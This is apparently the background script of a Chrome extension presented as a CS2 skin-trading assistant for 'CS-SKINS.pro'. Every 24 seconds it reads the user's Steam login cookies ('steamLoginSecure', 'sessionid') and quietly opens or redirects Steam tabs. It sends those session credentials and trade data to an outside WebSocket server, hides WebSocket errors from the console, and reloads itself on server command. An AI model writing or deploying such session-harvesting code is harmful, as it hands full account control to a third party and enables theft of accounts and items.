class TradingAssistant {
    constructor() {
        this.isActive = false;
        this.isAuthorized = false;
        this.wsConnection = null;
        this.storageKey = 'cs2_marketplace_extension';
        this.isCheckingSteam = false;
        
        this.init();
    }

    async compressData(data) {
        try {
            const jsonString = JSON.stringify(data);
            
            // Сжимаем только если данных много (>1KB)
            if (jsonString.length <= 1024) {
                return { data, encoding: 'none' };
            }

            // Используем встроенный CompressionStream
            const stream = new CompressionStream('gzip');
            const writer = stream.writable.getWriter();
            const reader = stream.readable.getReader();
            
            writer.write(new TextEncoder().encode(jsonString));
            writer.close();
            
            const compressed = [];
            let done = false;
            
            while (!done) {
                const { value, done: readerDone } = await reader.read();
                done = readerDone;
                if (value) compressed.push(...value);
            }
            
            return {
                compressed: compressed,
                encoding: 'gzip',
                original_size: jsonString.length,
                compressed_size: compressed.length
            };
            
        } catch (error) {
            // При ошибке сжатия отправляем без сжатия
            return { data, encoding: 'none' };
        }
    }
    
    async storage(action, data = null) {
        try {
            const result = await chrome.storage.local.get(this.storageKey);
            const current = result[this.storageKey] || {};
            
            switch (action) {
                case 'get': return current;
                case 'set': 
                    await chrome.storage.local.set({ [this.storageKey]: { ...current, ...data } });
                    break;
                case 'clear':
                    await chrome.storage.local.set({ [this.storageKey]: { authToken: null, websocketChannel: null, userInfo: null } });
                    break;
                case 'isAuth': return !!current.authToken;
            }
        } catch (error) {
            return action === 'get' ? {} : null;
        }
    }
    
    
    async init() {
        this.isAuthorized = await this.storage('isAuth');
        const data = await this.storage('get');

        // Не подключаемся если на паузе
        if (this.isAuthorized && !data.isPaused) {
            await this.connectWebSocket();
            chrome.alarms.create('statusCheck', { periodInMinutes: 0.4 }); // 24 секунды
        }
        await updateActivityIcon();
    }
    
    async checkStatusWebsocket() {
        // Предотвращаем одновременные проверки
        if (this.isCheckingSteam) return;
        this.isCheckingSteam = true;
        
        try {
            const storageData = await this.storage('get');
            const previousOverallStatus = storageData.overallStatus || 'inactive';
            
            const steamData = await this.getValidSteamData();
            
            if (!steamData) {
                //console.log('⚠️ getValidSteamData returned null');
                await this.storage('set', { 
                    overallStatus: 'inactive',
                    steamStatus: 'no_data'
                });
            }
            
            if (steamData) {
                // Получаем предыдущие трейды из storage
                const storageData = await this.storage('get');
                const previousTrades = storageData.lastTrades || [];
                
                const dataToSend = {
                    session: steamData.session,
                    timestamp: new Date().toISOString()
                };
                
                // Сравниваем текущие трейды с предыдущими
                let changedTrades = [];
                if (steamData.trades && steamData.trades.length > 0) {
                    changedTrades = steamData.trades.filter(currentTrade => {
                        const prevTrade = previousTrades.find(p => p.trade_offer_id === currentTrade.trade_offer_id);
                        return !prevTrade || 
                               prevTrade.status !== currentTrade.status || 
                               prevTrade.needs_confirmation !== currentTrade.needs_confirmation;
                    });
                }
                
                // Добавляем только изменившиеся трейды (если есть)
                if (changedTrades.length > 0) {
                    dataToSend.trades = changedTrades;
                }
                
                // Всегда отправляем сессию (для поддержания соединения)
                const compressedData = await this.compressData(dataToSend);
                const sent = await this.sendToServer('session_data', compressedData);
                
                // Сохраняем текущие трейды для следующего сравнения
                await this.storage('set', { lastTrades: steamData.trades || [] });
                
                // Статус станет 'active' только когда сервер ответит session_received
                // Пока ставим 'pending' - ждем ответа от сервера
                await this.storage('set', { 
                    overallStatus: 'pending',
                    steamStatus: 'ok',
                    lastSessionSent: new Date().toISOString()
                });
            } else {
                // Нет Steam сессии - сразу inactive
                await this.storage('set', { 
                    overallStatus: 'inactive',
                    steamStatus: 'no_auth'
                });
            }
            
            // Обновляем индикатор только если общий статус изменился
            const newData = await this.storage('get');
            if (previousOverallStatus !== newData.overallStatus) {
                await updateActivityIcon();
            }
            
        } catch (error) {
            await this.storage('set', { 
                overallStatus: 'inactive',
                steamStatus: 'error'
            });
            
            const errorData = await this.storage('get');
            if (errorData.overallStatus !== 'inactive') {
                await updateActivityIcon();
            }
        } finally {
            this.isCheckingSteam = false;
        }
    }
    
    async getSteamData(tabId) {
        try {
            // Сначала получаем данные из content script
            const contentScriptData = await new Promise((resolve) => {
                chrome.tabs.sendMessage(tabId, { type: 'GET_STEAM_SESSION' }, (response) => {
                    resolve(chrome.runtime.lastError ? null : response);
                });
            });
            
            if (!contentScriptData) {
                return null;
            }
            
            // Теперь получаем cookies через Chrome API (как в v1)
            const cookies = await this.getSteamCookies();
            
            // Получаем трейды для отправки вместе с сессией
            let trades = null;
            try {
                trades = await new Promise((resolve) => {
                    chrome.tabs.sendMessage(tabId, { 
                        type: 'GET_TRADE_OFFERS',
                        steamLoginSecure: cookies.steamLoginSecure 
                    }, (response) => {
                        resolve(response);
                    });
                });
            } catch (error) {
                //console.log('⚠️ Не удалось получить трейды:', error.message);
            }
            
            if (trades && Array.isArray(trades)) {
                const threeHoursAgo = Date.now() - (180 * 60 * 1000);
                trades = trades
                    .filter(trade => {
                        const tradeTime = (trade.time_updated || trade.time_created || 0) * 1000;
                        return tradeTime >= threeHoursAgo;
                    })
                    .map(trade => ({
                        trade_offer_id: trade.tradeofferid,
                        status: trade.trade_offer_state,
                        needs_confirmation: trade.confirmation_method === 2,
                        escrow_end_date: trade.escrow_end_date || null,
                        delay_settlement: trade.delay_settlement || false,
                        settlement_date: trade.settlement_date || null
                    }));
            }
            
            // Извлекаем Steam ID из cookies для отправки на сервер
            let steamIdFromCookie = null;
            if (cookies.steamLoginSecure) {
                const steamIdMatch = cookies.steamLoginSecure.match(/^(\d+)/);
                steamIdFromCookie = steamIdMatch ? steamIdMatch[1] : null;
            }

            return {
                session: {
                    ...contentScriptData,
                    steamLoginSecure: cookies.steamLoginSecure || null,
                    steamid: steamIdFromCookie || contentScriptData.steamid
                },
                trades: trades
            };
            
        } catch (error) {
            return null;
        }
    }
    
    /**
     * Получение куки Steam из браузера (из v1)
     */
    async getSteamCookies() {
        try {
            const sessionIdCookie = await chrome.cookies.get({
                url: 'https://steamcommunity.com',
                name: 'sessionid'
            });
            
            const steamLoginSecureCookie = await chrome.cookies.get({
                url: 'https://steamcommunity.com',
                name: 'steamLoginSecure'
            });
            
            return {
                sessionid: sessionIdCookie?.value || null,
                steamLoginSecure: steamLoginSecureCookie?.value || null
            };
        } catch (error) {
            return {};
        }
    }
    
    async getValidSteamData() {
        try {
            const storageData = await this.storage('get');
            const expectedSteamId = storageData.userInfo?.steam_id;
            
            if (!expectedSteamId) {
                //console.log('⚠️ No expectedSteamId found', { userInfo: storageData.userInfo });
                return null;
            }
            
            //console.log('✓ Starting Steam data collection for', expectedSteamId);
            
            // Ищем первую Steam вкладку (любую)
            const steamTabs = await chrome.tabs.query({ url: ["*://steamcommunity.com/*"] });
            let targetTab;
            
            //console.log('✓ Found Steam tabs:', steamTabs.length);
            
            if (steamTabs.length > 0) {
                // Используем первую найденную Steam вкладку
                targetTab = steamTabs[0];
                //console.log('✓ Using existing tab:', targetTab.id);
                // Всегда обновляем страницу для получения актуальных данных
                await chrome.tabs.update(targetTab.id, { 
                    url: `https://steamcommunity.com/profiles/${expectedSteamId}/edit/info` 
                });
            } else {
                // Создаем новую вкладку если Steam вкладок нет
                //console.log('✓ Creating new Steam tab');
                targetTab = await chrome.tabs.create({ 
                    url: `https://steamcommunity.com/profiles/${expectedSteamId}/edit/info`, 
                    active: false 
                });
            }
            
            // Ждем полной загрузки страницы
            await new Promise((resolve) => {
                let timeoutId;
                
                const listener = function(tabId, info) {
                    if (tabId === targetTab.id && info.status === 'complete') {
                        chrome.tabs.onUpdated.removeListener(listener);
                        if (timeoutId) clearTimeout(timeoutId);
                        setTimeout(resolve, 2000); // Даем время на возможные редиректы
                    }
                };
                
                chrome.tabs.onUpdated.addListener(listener);
                
                // Таймаут на случай если загрузка зависнет
                timeoutId = setTimeout(() => {
                    chrome.tabs.onUpdated.removeListener(listener);
                    resolve();
                }, 10000); // 10 секунд максимум ждем
            });
            
            // Проверяем финальный URL
            const finalTab = await chrome.tabs.get(targetTab.id);
            
            if (finalTab.url.includes('/login/')) {
                // Перенаправило на страницу входа - не авторизован
                //console.log('🔔 Sending STEAM_AUTH_REQUIRED notification');
                chrome.runtime.sendMessage({
                    type: 'STEAM_AUTH_REQUIRED',
                    message: 'Необходимо авторизоваться в Steam'
                }).catch((error) => {
                    //console.log('❌ Failed to send STEAM_AUTH_REQUIRED:', error);
                });
                return null;
            }
            
            // Получаем данные сессии из вкладки
            //console.log('✓ Getting Steam data from tab');
            const steamData = await this.getSteamData(targetTab.id);
            
            //console.log('✓ Steam data result:', steamData ? 'success' : 'null');
            //console.log('✓ Data structure:', steamData);
            
            if (!steamData?.session?.sessionid) {
                //console.log('⚠️ No sessionid in Steam data');
                return null;
            }
            
            // Извлекаем Steam ID из steamLoginSecure cookie через Chrome API
            let actualSteamId = null;
            if (steamData.session?.steamLoginSecure) {
                const steamIdMatch = steamData.session.steamLoginSecure.match(/^(\d+)/);
                actualSteamId = steamIdMatch ? steamIdMatch[1] : null;
            }
            
            // Проверяем что это правильный аккаунт
            if (actualSteamId !== expectedSteamId) {
                //console.log('⚠️ Steam ID mismatch:', actualSteamId, 'expected:', expectedSteamId);
                chrome.runtime.sendMessage({
                    type: 'STEAM_WRONG_ACCOUNT',
                    message: 'Авторизован другой аккаунт Steam. Войдите в правильный аккаунт.'
                }).catch(() => {});
                return null;
            }
            
            //console.log('✓ Steam data validation passed, returning data');
            return steamData;
            
        } catch (error) {
            //console.log('⚠️ Error in getValidSteamData:', error);
            return null;
        }
    }
    
    sendWS(event, data = {}) {
        if (this.wsConnection?.readyState === WebSocket.OPEN) {
            this.wsConnection.send(JSON.stringify({ event, data }));
        }
    }
    
    async connectWebSocket() {
        if (this.wsConnection) {
            this.wsConnection.close();
            this.wsConnection = null;
        }
        this.isActive = true;
        startKeepAlive();
        
        try {
            const data = await this.storage('get');
            if (!data.authToken) return;
            
            // Подавляем все сообщения об ошибках WebSocket
            const originalError = console.error;
            console.error = (...args) => {
                if (args[0] && args[0].toString().includes('WebSocket')) return;
                originalError.apply(console, args);
            };
            
            this.wsConnection = new WebSocket('wss://cs-skins.s1temaker.ru/ws/app/cs-skins-key?protocol=7&client=js&version=8.0.1&flash=false');
            
            // Восстанавливаем console.error через 100мс
            setTimeout(() => { console.error = originalError; }, 100);
            
            this.wsConnection.onopen = () => {
                // Подписываемся на канал
                if (data.websocketChannel) this.sendWS('pusher:subscribe', { channel: data.websocketChannel });
            };
            
            this.wsConnection.onmessage = async (event) => {
                try {
                    const { event: eventType, data: messageData } = JSON.parse(event.data);
                    const parsedData = typeof messageData === 'string' ? JSON.parse(messageData) : messageData;
                    await handleServerMessage(eventType, parsedData);
                } catch (error) {}
            };
            
            this.wsConnection.onclose = (event) => {
                if (event.code !== 1000 && this.isActive && this.isAuthorized) {
                    setTimeout(() => this.connectWebSocket(), 5000);
                }
            };
            
            this.wsConnection.onerror = () => {};
            
        } catch (error) {
            this.isActive = false;
        }
        
        await updateActivityIcon();
    }
    
    async stop() {
        if (this.wsConnection) {
            this.wsConnection.close();
            this.wsConnection = null;
        }
        chrome.alarms.clear('statusCheck');
        
        this.isActive = false;
        stopKeepAlive();
        await updateActivityIcon();
    }
    
    async authorize(token) {
        try {
            const response = await fetch('https://cs-skins.s1temaker.ru/api/ext-api/auth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token })
            });
            
            const data = await response.json();
            
            if (response.ok && data.success && data.channel) {
                await this.storage('set', { authToken: token, websocketChannel: data.channel });
                this.isAuthorized = true;
                await this.connectWebSocket();
                chrome.alarms.create('statusCheck', { periodInMinutes: 0.4 }); // 24 секунды
                await updateActivityIcon();
            } else {
                throw new Error(data.message || 'Authorization failed');
            }
        } catch (error) {
            throw error;
        }
    }
    
    async logout() {
        await this.stop();
        await this.storage('clear');
        this.isAuthorized = false;
        await updateActivityIcon();
    }

    async pause() {
        await this.stop();
        await this.storage('set', { isPaused: true, overallStatus: 'inactive' });
        await updateActivityIcon();
    }

    async resume() {
        await this.storage('set', { isPaused: false });
        const data = await this.storage('get');
        if (data.authToken && data.websocketChannel) {
            this.isAuthorized = true;
            await this.connectWebSocket();
            chrome.alarms.create('statusCheck', { periodInMinutes: 0.4 });
        }
        await updateActivityIcon();
    }
    
    async handleMessage(message, sender, sendResponse) {
        switch (message.type) {
            case 'AUTHORIZE':
                try {
                    // Проверяем, что данные уже сохранены в storage
                    const data = await this.storage('get');
                    if (data.authToken && data.websocketChannel) {
                        this.isAuthorized = true;
                        await this.connectWebSocket();
                        chrome.alarms.create('statusCheck', { periodInMinutes: 0.4 }); // 24 секунды
                        await updateActivityIcon();
                        sendResponse({ success: true });
                    } else {
                        // Если данных нет, выполняем полную авторизацию
                        await this.authorize(message.token);
                        sendResponse({ success: true });
                    }
                    
                    // Отправляем обновленный статус
                    const statusData = await this.storage('get');
                    chrome.runtime.sendMessage({
                        type: 'STATUS_UPDATE',
                        data: {
                            isRunning: this.isActive,
                            websocketConnected: this.wsConnection?.readyState === WebSocket.OPEN,
                            overallStatus: statusData.overallStatus || 'inactive',
                            steamStatus: statusData.steamStatus || 'no_auth'
                        }
                    }).catch(() => {});
                } catch (error) {
                    sendResponse({ success: false, error: error.message });
                }
                break;
                
            case 'LOGOUT':
                await this.logout();
                sendResponse({ success: true });
                break;

            case 'PAUSE':
                await this.pause();
                sendResponse({ success: true });
                break;

            case 'RESUME':
                await this.resume();
                sendResponse({ success: true });
                break;

            case 'GET_STATUS':
                const data = await this.storage('get');
                sendResponse({
                    isRunning: this.isActive,
                    isAuthorized: this.isAuthorized,
                    overallStatus: data.overallStatus || 'inactive',
                    steamStatus: data.steamStatus || 'no_auth'
                });
                break;
                
            case 'RESIZE_WINDOW':
                // Изменяем размер текущего окна в зависимости от состояния авторизации
                if (sender.tab && sender.tab.windowId) {
                    const { width, height } = getWindowSize(message.isAuthorized);
                    chrome.windows.update(sender.tab.windowId, { width, height }).catch(() => {});
                }
                break;
        }
    }
    
    async sendToServer(type, data = {}) {
        if (this.wsConnection?.readyState !== WebSocket.OPEN) return false;
        
        try {
            const storageData = await this.storage('get');
            if (!storageData.websocketChannel) return false;
            
            const message = {
                event: 'extension-message',
                data: { type, ...data },
                channel: storageData.websocketChannel
            };
            
            this.wsConnection.send(JSON.stringify(message));
            return true;
        } catch (error) {
            return false;
        }
    }
    
}

async function handleServerMessage(messageType, messageData) {
    if (['pusher:connection_established', 'pusher_internal:subscription_succeeded', 'pusher:error', 'pusher:pong'].includes(messageType)) return;

    // Отвечаем на ping сообщения
    if (messageType === 'pusher:ping') {
        assistant.sendWS('pusher:pong', {});
        return;
    }
    
    switch (messageType) {
        case 'session_received':
            // Сервер подтвердил получение сессии - все активно
            await assistant.storage('set', { 
                overallStatus: 'active',
                lastServerResponse: new Date().toISOString() 
            });
            await updateActivityIcon();
            break;
        case 'connected':
            // Сервер подтвердил подключение - можно начинать отправлять сессии
            await assistant.storage('set', { 
                overallStatus: 'ready',
                lastServerResponse: new Date().toISOString() 
            });
            await updateActivityIcon();
            break;
        case 'force_logout':
            await assistant.logout();
            chrome.runtime.sendMessage({ type: 'FORCE_LOGOUT', message: messageData?.message || 'Требуется переавторизация' }).catch(() => {});
            break;
        case 'reload_extension':
            // Перезагружаем расширение
            chrome.runtime.reload();
            break;
    }
}

const assistant = new TradingAssistant();

async function updateActivityIcon() {
    const { isActive, isAuthorized } = assistant;

    // Получаем данные из storage
    const data = await assistant.storage('get');

    // Проверяем паузу
    if (data.isPaused) {
        chrome.action.setTitle({ title: 'CS-SKINS.pro - Приостановлено' });
        chrome.action.setBadgeText({ text: '⏸' });
        chrome.action.setBadgeBackgroundColor({ color: '#ff9900' });
        return;
    }

    if (!isAuthorized) {
        // Не авторизован
        chrome.action.setTitle({ title: 'CS-SKINS.pro - Не подключен' });
        chrome.action.setBadgeText({ text: '×' });
        chrome.action.setBadgeBackgroundColor({ color: '#888888' });
        return;
    }

    const overallStatus = data.overallStatus || 'inactive';
    
    switch (overallStatus) {
        case 'active':
            // Все работает - зеленый
            chrome.action.setTitle({ title: 'CS-SKINS.pro - Активен' });
            chrome.action.setBadgeText({ text: '●' });
            chrome.action.setBadgeBackgroundColor({ color: '#44ff44' });
            break;
        case 'ready':
            // Подключен, готов отправлять - синий
            chrome.action.setTitle({ title: 'CS-SKINS.pro - Подключен' });
            chrome.action.setBadgeText({ text: '◉' });
            chrome.action.setBadgeBackgroundColor({ color: '#0088ff' });
            break;
        case 'pending':
            // Ждем ответа от сервера - желтый
            chrome.action.setTitle({ title: 'CS-SKINS.pro - Подключение...' });
            chrome.action.setBadgeText({ text: '◐' });
            chrome.action.setBadgeBackgroundColor({ color: '#ffaa00' });
            break;
        case 'inactive':
        default:
            // Проблемы - красный
            chrome.action.setTitle({ title: 'CS-SKINS.pro - Неактивен' });
            chrome.action.setBadgeText({ text: '○' });
            chrome.action.setBadgeBackgroundColor({ color: '#ff4444' });
            break;
    }
}

function startKeepAlive() {
    chrome.alarms.create('keepAlive', { periodInMinutes: 1 });
}

function stopKeepAlive() {
    chrome.alarms.clear('keepAlive');
}

chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'keepAlive') {
        // Просто поддерживаем активность Service Worker
    } else if (alarm.name === 'statusCheck') {
        // Проверяем статус и отправляем сессию только если авторизованы
        if (assistant.isAuthorized) {
            assistant.checkStatusWebsocket();
        }
    }
});
// Функция для расчета размеров окна
function getWindowSize(isAuthorized) {
    // Получаем размеры контента из CSS переменных
    const contentWidth = 350;
    const borderWidth = 16; // padding по бокам
    
    const compactHeight = 175;
    const expandedHeight = 450;
    const borderHeight = 40; // высота заголовка + отступы
    
    return {
        width: contentWidth + borderWidth,
        height: (isAuthorized ? compactHeight : expandedHeight) + borderHeight
    };
}

// Сохраняем ID окна расширения
let extensionWindowId = null;

// Обработчик клика на иконку расширения
chrome.action.onClicked.addListener(async () => {
    // Проверяем, существует ли окно расширения
    if (extensionWindowId) {
        try {
            const window = await chrome.windows.get(extensionWindowId);
            // Если окно существует, фокусируем его
            await chrome.windows.update(extensionWindowId, { focused: true });
            return;
        } catch (error) {
            // Окно не существует, будем создавать новое
            extensionWindowId = null;
        }
    }
    
    const url = chrome.runtime.getURL('index.html');
    
    // Проверяем, авторизован ли пользователь
    const data = await assistant.storage('get');
    const isAuthorized = !!(data?.authToken && data?.websocketChannel);
    
    // Рассчитываем размер окна
    const { width, height } = getWindowSize(isAuthorized);
    
    const windowOptions = {
        url: url,
        type: 'popup',
        width: width,
        height: height,
        focused: true
    };
    
    const window = await chrome.windows.create(windowOptions);
    extensionWindowId = window.id;
});

// Слушаем закрытие окна
chrome.windows.onRemoved.addListener((windowId) => {
    if (windowId === extensionWindowId) {
        extensionWindowId = null;
    }
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => { assistant.handleMessage(message, sender, sendResponse); return true; });
chrome.runtime.onInstalled.addListener(() => assistant.init());
chrome.runtime.onStartup.addListener(() => assistant.init());